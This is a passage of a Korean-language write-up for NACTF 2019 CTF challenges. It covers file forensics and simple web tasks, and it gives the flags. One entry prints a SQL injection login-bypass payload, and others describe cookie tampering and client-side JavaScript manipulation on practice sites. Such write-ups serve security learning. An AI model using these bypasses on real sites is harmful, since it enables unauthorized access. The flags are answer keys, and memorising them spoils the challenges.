0010: 0a34 2030 206f 626a 0a3c 3c20 2f4c 656e  .4 0 obj.<< /Len
0020: 6774 6820 3520 3020 5220 2f46 696c 7465  gth 5 0 R /Filte
```
pdf 파일인데 pdf 시그니처가 없다. pdf 시그니처인 `%PDF-`를 추가해주었다.
``` bash
➜ echo "%PDF-" > result.pdf
➜ cat Kellens_broken_file.pdf >> result.pdf
```
## flag
`nactf{kn0w_y0ur_f1l3_h34d3rsjeklwf}`

# Filesystem Image
```
Put the path to flag.txt together to get the flag! for example, if it was located at ab/cd/ef/gh/ij/flag.txt, your flag would be nactf{abcdefghij}
```
## analysis
압축을 풀면 iso 이미지 파일이 있다.
``` bash
➜ file img.iso 
img.iso: DOS/MBR boot sector; partition 1 : ID=0xc, start-CHS (0x0,0,2), end-CHS (0x0,130,2), startsector 1, 8191 sectors
```
디스크 파일이라 바로 마운트가 안되고, 마운트할 파티션의 위치를 찾아주어야 하는데, 위 파일에서 첫번째 파티션은 1섹터에서 시작이다. 오프셋을 인자로 줘서 mount 시키면 된다.

## solve
``` bash
➜ sudo mount -o loop,offset=512 img.iso /mnt/loop0
➜ cd /mnt/loop0/
➜ find ./ | grep flag
./lq/wk/zo/py/hu/flag.txt
```
## flag
`nactf{lqwkzopyhu}`

# Phuzzy Photo
```
Joyce's friend just sent her this photo, but it's really fuzzy. She has no idea what the message says but she thinks she can make out some black text in the middle. She gave the photo to Oligar, but even his super eyes couldn't read the text. Maybe you can write some code to find the message?

Also, you might have to look at your screen from an angle to see the blurry hidden text

P.S. Joyce's friend said that part of the message is hidden in every 6th pixel
```
## can't solve
겁나 삽질했는데 도저히 모르겠음...근데 많은 사람이 푼걸로 보아 나만 모르는듯,,

# File recovery
```
Uh oh! Lillian has accidentally deleted everything on her flash drive! Here's an image of the drive; find the PNG and get the flag.
```
## solve
플래시 드라이브에서 이미지를 삭제했다고 한다. 디스크에 png 데이터가 있을 것이므로 `winhex`를 이용해서 카빙(Tools - Disk Tools - File Recovery by Type..)했다.
## flag 
`nactf{f1l3_r3c0v3ry_15_c0ol}`

# Pink Panther
```
Rahul loves the Pink Panther. He even made this website:

http://pinkpanther.web.2019.nactf.com

I think he hid a message somewhere on the webpage, but I don't know where... can you INSPECT and find the message?

https://www.youtube.com/watch?v=2HMSnfeNf8c
```
## solve
홈페이지 들어가서 코드를 보면 주석으로 플래그가 있다.
## flag
`nactf{1nsp3ct_b3tter_7han_c10us3au}`

# Scooby Doo
```
Kira loves to watch Scooby Doo so much that she made a website about it! She also added a clicker game which looks impossible. Can you use your inspector skills from Pink Panther to reveal the flag?

http://scoobydoo.web.2019.nactf.com
```
## solve
`GAME`탭에 들어가면 1,000,000,000번 클릭하면 flag를 준다고 한다. javascript 코드에서 `clickCount ++;` 이 부분을 `clickCount += 1000000000;`로 바꿔줘서 한번 클릭으로 성공할 수 있도록 수정한다. 이후 `Click Me!` 버튼을 오지게 따라다니면서 한번 클릭을 성공한다. 는 아니고 콘솔에서 `document.getElementsByTagName("button")[0].click()`로 클릭한다.

## flag
`nactf{ult1m4T3_sh4ggY}`

# Dexter's Lab
```
Dee Dee,

Please check in on your brother's lab at dexterslab.web.2019.nactf.com We know his username is Dexter, but we don't know his password! Maybe you can use a SQL injection?

Mom + Dad
```
## solve
홈페이지 들어가면 로그인 창밖에 없다. 아이디에 SQLinjection을 넣어서 로그인을 우회한다.

## payload
`'||1#`

## flag
`nactf{1nj3c7ion5_ar3_saf3_in_th3_l4b}`


# Sesame Street
```
Surprisingly, The20thDuck loves cookies! He also has no idea how to use php. He accidentally messed up a cookie so it's only available on the countdown page... Also why use cookies in the first place?

sesamestreet.web.2019.nactf.com
```
## solve
홈페이지에 `I love cookies!`라는 문구로 보아 쿠키를 변조하는 문제인것 같다. `Countdown`탭에 들어가면 ctf가 끝나야 flag를 보여주는것 같다. 예상했던대로 쿠키에 `session-time`이라는 쿠키에 현재시간 데이터가 있었고, 이를 변조해서 현재시간을 속일 수 있었다.

## flag
`nactf{c000000000ki3s}`


